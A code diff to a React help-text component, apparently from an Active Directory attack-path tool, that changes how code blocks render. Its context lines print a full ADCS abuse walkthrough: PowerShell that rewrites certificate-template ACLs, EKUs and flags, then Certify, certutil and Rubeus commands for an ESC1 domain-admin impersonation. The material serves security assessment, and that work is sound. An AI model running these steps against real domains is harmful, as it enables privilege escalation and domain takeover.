@@ -17,6 +17,7 @@
 import { FC } from 'react';
 import { Typography } from '@mui/material';
 import { useHelpTextStyles } from '../utils';
+import CodeController from '../CodeController/CodeController';
 
 const WindowsAbuse: FC = () => {
     const classes = useHelpTextStyles();
@@ -32,7 +33,7 @@ const WindowsAbuse: FC = () => {
                 <br />
                 Use the following PowerShell snippet to check the current ownership on the certificate template:
             </Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 
                 # Find the certificate template
@@ -42,11 +43,11 @@ const WindowsAbuse: FC = () => {
                 # Print the owner
                 $acl = $template.psbase.ObjectSecurity
                 $acl.Owner`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2'>
                 Use the following PowerShell snippet to grant the principal ownership on the certificate template:
             </Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 $principalName = "principal"     # SAM account name of principal
                 
@@ -59,7 +60,7 @@ const WindowsAbuse: FC = () => {
                 $account = New-Object System.Security.Principal.NTAccount($principalName)
                 $acl.SetOwner($account)
                 $template.psbase.CommitChanges()`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2'>
                 Confirm that the ownership was changed by running the first script again
                 <br />
@@ -81,7 +82,7 @@ const WindowsAbuse: FC = () => {
                 <br />
                 Use the following PowerShell snippet to grant the principal GenericAll on the certificate template:
             </Typography>
-            <Typography component={'pre'}>
+            <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 $principalName = "principal"     # SAM account name of principal
                 
@@ -102,9 +103,9 @@ const WindowsAbuse: FC = () => {
                 $acl = $template.psbase.ObjectSecurity
                 $acl.AddAccessRule($ace)
                 $template.psbase.CommitChanges()`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2'>Confirm that the GenericAll ACE was added:</Typography>
-            <Typography component={'pre'}>
+            <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 $principalName = "principal"     # SAM account name of principal
                 
@@ -115,9 +116,9 @@ const WindowsAbuse: FC = () => {
                 # Print ACEs granted to the principal
                 $acl = $template.psbase.ObjectSecurity
                 $acl.Access | ? { $_.IdentityReference -like "*$principalName" }`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2'>After abuse, remove the GenericAll ACE you added:</Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 $principalName = "principal"     # SAM account name of principal
                 
@@ -138,7 +139,7 @@ const WindowsAbuse: FC = () => {
                 $acl = $template.psbase.ObjectSecurity
                 $acl.RemoveAccessRuleSpecific($ace)
                 $template.psbase.CommitChanges()`}
-            </Typography>
+            </CodeController>
         </>
     );
 
@@ -157,7 +158,7 @@ const WindowsAbuse: FC = () => {
                     pKIExtendedKeyUsage
                 </code> and <code>msPKI-Certificate-Application-Policy</code> attributes of the certificate template:
             </Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 
                 # Find the certificate template
@@ -172,7 +173,7 @@ const WindowsAbuse: FC = () => {
                 # Print attributes
                 Write-Host "pKIExtendedKeyUsage: $($template.Properties["pKIExtendedKeyUsage"])"
                 Write-Host "msPKI-Certificate-Application-Policy: $($template.Pro`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2'>
                 To run the LDAP query as another principal, replace <code>DirectoryEntry($ldapPath)</code> with{' '}
                 <code>DirectoryEntry($ldapPath, $ldapUsername, $ldapPassword)</code> to specify the credentials of the
@@ -181,7 +182,7 @@ const WindowsAbuse: FC = () => {
                 <br />
                 Add the Client Authentication EKU:
             </Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 $eku = "1.3.6.1.5.5.7.3.2"       # Client Authentication EKU
                 
@@ -199,14 +200,14 @@ const WindowsAbuse: FC = () => {
                 $template.Properties["msPKI-Certificate-Application-Policy"].Add($eku) | Out-Null
                 $template.CommitChanges()
                 $ldap.Close()`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2'>
                 Run the first PowerShell snippet again to confirm the EKU has been added.
                 <br />
                 <br />
                 After abuse, remove the Client Authentication EKU:
             </Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 $eku = "1.3.6.1.5.5.7.3.2"       # Client Authentication EKU
                 
@@ -224,7 +225,7 @@ const WindowsAbuse: FC = () => {
                 $template.Properties["msPKI-Certificate-Application-Policy"].Remove($eku) | Out-Null
                 $template.CommitChanges()
                 $ldap.Close()`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2'>Verify the EKU has been removed using the first PowerShell snippet.</Typography>
         </>
     );
@@ -247,7 +248,7 @@ const WindowsAbuse: FC = () => {
                 value of the <code>msPKI-Certificate-Name-Flag</code> attribute of the certificate template and its
                 enabled flags:
             </Typography>
-            <Typography component={'pre'}>
+            <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 $eku = "1.3.6.1.5.5.7.3.2"       # Client Authentication EKU
                 
@@ -299,11 +300,11 @@ const WindowsAbuse: FC = () => {
                         Write-Host "0x$("{0:X8}" -f $flag) $($flagTable[$flag])"
                     }
                 }`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2' className={classes.containsCodeEl}>
                 Flip the <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> flag:
             </Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 $flagToFlip = 0x00000001         # CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
                 
@@ -321,7 +322,7 @@ const WindowsAbuse: FC = () => {
                 $template.Properties["msPKI-Certificate-Name-Flag"].Value = $curValue -bxor $flagToFlip
                 $template.CommitChanges()
                 $ldap.Close()`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2' className={classes.containsCodeEl}>
                 To run the LDAP query as another principal, replace <code>DirectoryEntry($ldapPath)</code> with{' '}
                 <code>DirectoryEntry($ldapPath, $ldapUsername, $ldapPassword)</code> to specify the credentials of the
@@ -355,7 +356,7 @@ const WindowsAbuse: FC = () => {
                 PowerShell snippet to check the value of the <code>msPKI-Enrollment-Flag</code> attribute of the
                 certificate template and its enabled flags:
             </Typography>
-            <Typography component={'pre'}>
+            <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 
                 # Find the certificate template
@@ -396,11 +397,11 @@ const WindowsAbuse: FC = () => {
                         Write-Host "0x$("{0:X8}" -f $flag) $($flagTable[$flag])"
                     }
                 }`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2' className={classes.containsCodeEl}>
                 Flip the <code>CT_FLAG_PEND_ALL_REQUESTS</code> flag:
             </Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 $flagToFlip = 0x00000002         # CT_FLAG_PEND_ALL_REQUESTS
                 
@@ -418,7 +419,7 @@ const WindowsAbuse: FC = () => {
                 $template.Properties["msPKI-Enrollment-Flag"].Value = $curValue -bxor $flagToFlip
                 $template.CommitChanges()
                 $ldap.Close()`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2' className={classes.containsCodeEl}>
                 To run the LDAP query as another principal, replace <code>DirectoryEntry($ldapPath)</code> with{' '}
                 <code>DirectoryEntry($ldapPath, $ldapUsername, $ldapPassword)</code> to specify the credentials of the
@@ -448,7 +449,7 @@ const WindowsAbuse: FC = () => {
                 <code>msPKI-RA-Signature</code> attribute value is more than zero. Use the following PowerShell snippet
                 to check the value of the <code>msPKI-RA-Signature</code> attribute:
             </Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 
                 # Find the certificate template
@@ -463,11 +464,11 @@ const WindowsAbuse: FC = () => {
                 # Print attribute
                 Write-Host "msPKI-RA-Signature: $($template.Properties["msPKI-RA-Signature"])"
                 $ldap.Close()`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2' className={classes.containsCodeEl}>
                 Set <code>msPKI-RA-Signature</code> to 0:
             </Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 $noSignatures = [Int32]0
                 
@@ -484,7 +485,7 @@ const WindowsAbuse: FC = () => {
                 $template.Properties["msPKI-RA-Signature"].Value = $noSignatures
                 $template.CommitChanges()
                 $ldap.Close()`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2' className={classes.containsCodeEl}>
                 To run the LDAP query as another principal, replace <code>DirectoryEntry($ldapPath)</code> with{' '}
                 <code>DirectoryEntry($ldapPath, $ldapUsername, $ldapPassword)</code> to specify the credentials of the
@@ -510,18 +511,18 @@ const WindowsAbuse: FC = () => {
                 this Cypher query (replace <code>"PRINCIPAL@DOMAIN.NAME"</code> and{' '}
                 <code>"CERTTEMPLATE@DOMAIN.NAME"</code> with the names of the principal and the certificate template):
             </Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {`MATCH p = (x)-[:MemberOf*0..]->()-[:Enroll|AllExtendRights|GenericAll]->(ct:CertTemplate)
                 WHERE x.name = "PRINCIPAL@DOMAIN.NAME" AND ct.name = "CERTTEMPLATE@DOMAIN.NAME"
                 RETURN p`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2' className={classes.containsCodeEl}>
                 If a path is returned, continue to the next step.
                 <br />
                 <br />
                 Use the following PowerShell snippet to grant the principal Enroll on the certificate template:
             </Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 $principalName = "principal"     # SAM account name of principal
                 
@@ -547,11 +548,11 @@ const WindowsAbuse: FC = () => {
                 $acl = $template.psbase.ObjectSecurity
                 $acl.AddAccessRule($ace)
                 $template.psbase.CommitChanges()`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2' className={classes.containsCodeEl}>
                 Confirm that the Enroll ACE was added:
             </Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 $principalName = "principal"     # SAM account name of principal
                 
@@ -562,11 +563,11 @@ const WindowsAbuse: FC = () => {
                 # Print ACEs granted to the principal
                 $acl = $template.psbase.ObjectSecurity
                 $acl.Access | ? { $_.IdentityReference -like "*$principalName" }`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2' className={classes.containsCodeEl}>
                 After abuse, remove the Enroll ACE you added:
             </Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 $principalName = "principal"     # SAM account name of principal
                 
@@ -592,7 +593,7 @@ const WindowsAbuse: FC = () => {
                 $acl = $template.psbase.ObjectSecurity
                 $acl.RemoveAccessRuleSpecific($ace)
                 $template.psbase.CommitChanges()`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2'>
                 The principal can now perform an ESC1 attack with the following steps:
             </Typography>
@@ -605,11 +606,11 @@ const WindowsAbuse: FC = () => {
                 <b>Step 6</b>: Use Certify to request enrollment in the affected template, specifying the affected
                 certification authority and target principal to impersonate:
             </Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {
                     'Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:"ESC1" /altname:forestroot\\ForestRootDA'
                 }
-            </Typography>
+            </CodeController>
             <Typography variant='body2'>Save the certificate as cert.pem and the private key as cert.key.</Typography>
         </>
     );
@@ -619,7 +620,7 @@ const WindowsAbuse: FC = () => {
             <Typography variant='body2'>
                 <b>Step 7</b>: Convert the emitted certificate to PFX format:
             </Typography>
-            <Typography component={'pre'}>{'certutil.exe -MergePFX .\\cert.pem .\\cert.pfx'}</Typography>
+            <CodeController hideWrap>{'certutil.exe -MergePFX .\\cert.pem .\\cert.pfx'}</CodeController>
         </>
     );
 
@@ -628,7 +629,7 @@ const WindowsAbuse: FC = () => {
             <Typography variant='body2'>
                 <b>Step 8</b>: Optionally purge all kerberos tickets from memory:
             </Typography>
-            <Typography component={'pre'}>{'klist purge'}</Typography>
+            <CodeController hideWrap>{'klist purge'}</CodeController>
         </>
     );
     const step9 = (
@@ -637,9 +638,9 @@ const WindowsAbuse: FC = () => {
                 <b>Step 9</b>: Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the
                 target identity to impersonate and the PFX-formatted certificate created in Step 7:
             </Typography>
-            <Typography component={'pre'}>
+            <CodeController>
                 {'Rubeus asktgt /user:"forestroot\\forestrootda" /certificate:cert.pfx /password:asdf /ptt'}
-            </Typography>
+            </CodeController>
         </>
     );
     const step10 = (
@@ -647,7 +648,7 @@ const WindowsAbuse: FC = () => {
             <Typography variant='body2'>
                 <b>Step 10</b>: Optionally verify the TGT by listing it with the klist command:
             </Typography>
-            <Typography component={'pre'}>{'klist'}</Typography>
+            <CodeController hideWrap>{'klist'}</CodeController>
         </>
     );
 
